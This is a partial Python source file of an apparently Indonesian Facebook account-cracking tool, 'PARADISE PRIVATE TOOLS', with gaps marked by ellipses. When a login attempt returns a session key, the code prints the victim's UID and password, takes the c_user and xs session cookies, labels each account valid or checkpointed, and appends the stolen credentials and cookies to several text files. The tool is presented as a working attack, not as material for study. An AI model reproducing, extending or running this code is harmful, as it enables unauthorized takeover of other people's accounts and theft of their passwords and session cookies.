...
def ____banner____():
    ...
    print("""\x1b[38;5;46m
                                             ...
                                             88P  `8P                
                                            d88                      
?88,.d88b, d888b8b    88bd88b d888b8b   d888888    88b .d888b, d8888b
`?88'  ?88d8P' ?88    88P'  `d8P' ?88  d8P' ?88    88P ?8b,   d8b_,dP
  88b  d8P88b  ,88b  d88     88b  ,88b 88b  ,88b  d88    `?8b 88b    
  888888P'`?88P'`88bd88'     `?88P'`88b`?88P'`88bd88' `?888P' `?888P'
  88P'                                                               
 d88                                                                 
 ?8P                                                                 
                
        
\x1b[38;5;51m━━━━━━━━━━━━━━━━━━━━━━━┫ \x1b[38;5;196mPARADISE PRIVATE TOOLS \x1b[38;5;51m┣━━━━━━━━━━━━━━━━━━━━━━━
   \x1b[38;5;196m(★)\x1b[38;5;46m VERSION   \x1b[1;37m:\x1b[38;5;51m 5.0 FINAL BUILD
   \x1b[38;5;196m(★)\x1b[38;5;46m AUTHOR    \x1b[1;37m:\x1b[38;5;51m PARADISE | CYBER CROOOTTT
   \x1b[38;5;196m(★)\x1b[38;5;46m GITHUB    \x1b[1;37m:\x1b[38;5;51m github.com/300_CROT_DIDALAM
   ...
   \x1b[38;5;196m(★)\x1b[38;5;46m UPDATED   \x1b[1;37m:\x1b[38;5;51m 14-NOV-2025 🗓️
\x1b[38;5;51m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
""")
    ...
    "User-Agent": str(random.choice([
        ...
        "x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62"
            ...
            if 'session_key' in res:
                print("\033[93m───[ CROOT DEK ]──────────────────\033[0m")
                print(f"\033[93m🆔 : {uid}\033[0m")
                print(f"\033[93m🔑 : {pw}\033[0m")
                print(f"\033[93m📅 : {creationyear(uid)}\033[0m")

                # ============ AMBIL COOKIES LOGIN VALID ==============
                all_cookies = session.cookies.get_dict()

                # cek apakah login valid (c_user + xs harus ada)
                if "c_user" in all_cookies and "xs" in all_cookies:
                    cookie_string = "; ".join([f"{k}={v}" for k, v in all_cookies.items()])
                    print("\033[92m🍪 COOKIES :\033[0m", cookie_string)
                    status = "UREP"
                else:
                    cookie_string = ""
                    status = "CP"
                    print("\033[91m❌ COOKIES TIDAK LENGKAP (CP)\033[0m")
                # =========================================
                ...
                # Simpan global (lama)
                with open(cookies_path, "a") as ck:
                    ck.write(f"{uid}|{pw}|{cookie_string}\n")
                # =====================================================

                # ============ STATUS VALID / CP PRINT ==========
                if cookie_string.strip() == "":
                    status = "CP"
                    print("\033[91m❌ STATUS : CP\033[0m")
                else:
                    status = "UREP"
                    print("\033[92m✔ STATUS : UREP\033[0m")

                with open(status_path, "a") as st:
                    st.write(f"{uid}|{pw}|{status}\n")
                # =========================================
                # =================== RAINBOW PANEL ===================
                ...
                rainbow = [
                    ...
                    "\033[38;5;118m", "\033[38;5;51m", "\033[38;5;27m",
                    "\033[38;5;93m", "\033[38;5;129m"
                ]

                def rb(index):
                    return rainbow[index % len(rainbow)]

                def box(text, width=42):
                    return text + (" " * (width - len(text)))

                # Potong cookies panjang
                if cookie_string != "":
                    cookie_short = cookie_string[:40] + "..." if len(cookie_string) > 40 else cookie_string
                else:
                    cookie_short = "NONE"

                # Cetak panel
                print(rb(0) + "┌" + "─" * 42 + "┐")
                print(rb(1) + "│" + box("        𝗟𝗢𝗚𝗜𝗡 𝗥𝗘𝗦𝗨𝗟𝗧        ") + "│")
                print(rb(2) + "├" + "─" * 42 + "┤")

                print(rb(3) + "│ UID     : " + box(uid, 31) + "│")
                print(rb(4) + "│ PASS    : " + box(pw, 31) + "│")
                print(rb(5) + "│ YEAR    : " + box(str(creationyear(uid)), 31) + "│")

                # status warna beda
                stat_color = "\033[92m" if status == "UREP" else "\033[91m"
                print(rb(6) + "│ STATUS  : " + box(status, 31) + "│" + "\033[0m")

                print(rb(7) + "│ UA      : " + box(ua[:31], 31) + "│")

                print(rb(8) + "├" + "─" * 42 + "┤")
                print(rb(9) + "│ COOKIES : " + box(cookie_short, 31) + "│")
                print(rb(10) + "└" + "─" * 42 + "┘" + "\033[0m")

                # ============ PENYIMPANAN PER FOLDER ==========
                ...
                if status == "UREP":
                    save_path = os.path.join(ok_dir, "OK.txt")
                    with open(save_path, "a") as f:
                        f.write(f"{uid}|{pw}|{cookie_string}\n")
                else:
                    save_path = os.path.join(cp_dir, "CP.txt")
                    with open(save_path, "a") as f:
                        f.write(f"{uid}|{pw}|{cookie_string}\n")
                # =========================================
